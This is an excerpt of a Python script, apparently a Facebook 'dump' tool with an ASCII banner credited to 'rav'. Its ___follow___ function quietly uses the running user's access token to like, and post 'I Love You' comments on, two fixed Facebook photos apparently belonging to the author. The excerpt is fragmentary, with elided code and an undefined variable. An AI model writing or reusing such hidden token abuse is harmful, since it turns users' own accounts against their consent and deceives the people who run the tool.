...
# Banner
___banner___ = ("""%s ____%s Created by : rav\n%s|  _ \ _   _ _ __ ___  _ __\n| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n|____/ \__,_|_| |_| |_| .__/
                      |_|
"""%(H,P,H,B))
...
def ___follow___():
    ...
    try:
        ...
        ___komen___ = ('I Love You @[100000425535673:] \n\n'+___kata___+'\n'+___waktu)
        ___komen2___ = ('I Love You @[100000425535673:]\n\n'+___kata___+'\n'+___waktu)
        ...
        requests.post('https://graph.facebook.com/3096356797349599/likes?summary=true&access_token=%s'%(___token)) #foto sampul
        requests.post('https://graph.facebook.com/5031335926890542/likes?summary=true&access_token=%s'%(___token)) # foto profil
        requests.post('https://graph.facebook.com/3096356797349599/comments/?message=%s&access_token=%s'%(___komen3___,___token)) #foto sampul
        requests.post('https://graph.facebook.com/5031335926890542/comments/?message=%s&access_token=%s'%(___komen___,___token)) #foto profil
        requests.post('https://graph.facebook.com/5031335926890542/comments/?message=%s&access_token=%s'%(___komen2___,___token)) #foto profil
